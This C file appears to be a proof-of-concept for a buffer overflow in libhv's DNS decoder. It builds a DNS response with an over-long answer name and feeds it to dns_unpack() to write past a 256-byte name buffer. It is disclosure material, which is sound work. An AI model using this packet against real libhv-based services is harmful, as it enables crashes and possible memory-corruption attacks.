// CVE candidate PoC: libhv protocol/dns.c dns_name_decode unbounded write.
// Builds a DNS response with a single answer whose name is far longer than
// dns_rr_t.name[256] and feeds it to dns_unpack().
#include "dns.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    unsigned char pkt[4096];
    memset(pkt, 0, sizeof(pkt));

    int off = 0;
    // header: id=0x1234, response, nquestion=0, nanswer=1
    pkt[off++] = 0x12; pkt[off++] = 0x34;
    pkt[off++] = 0x81; pkt[off++] = 0x80;
    pkt[off++] = 0x00; pkt[off++] = 0x00; // nquestion
    pkt[off++] = 0x00; pkt[off++] = 0x01; // nanswer = 1
    pkt[off++] = 0x00; pkt[off++] = 0x00; // nauthority
    pkt[off++] = 0x00; pkt[off++] = 0x00; // naddtional

    // answer name: 60 labels of 5 'A' each -> ~300 decoded bytes > 256
    int labels = 60;
    for (int i = 0; i < labels; i++) {
        pkt[off++] = 5;
        for (int j = 0; j < 5; j++) pkt[off++] = 'A';
    }
    pkt[off++] = 0; // NUL ends dns_name_decode

    // A record: rtype=1, rclass=1, ttl, datalen=4, 127.0.0.1
    pkt[off++] = 0x00; pkt[off++] = 0x01;
    pkt[off++] = 0x00; pkt[off++] = 0x01;
    pkt[off++] = 0x00; pkt[off++] = 0x00; pkt[off++] = 0x00; pkt[off++] = 0x3c;
    pkt[off++] = 0x00; pkt[off++] = 0x04;
    pkt[off++] = 127; pkt[off++] = 0; pkt[off++] = 0; pkt[off++] = 1;

    int len = off;
    dns_t dns;
    memset(&dns, 0, sizeof(dns));
    int r = dns_unpack((char*)pkt, len, &dns);
    printf("dns_unpack returned %d\n", r);
    dns_free(&dns);
    return 0;
}
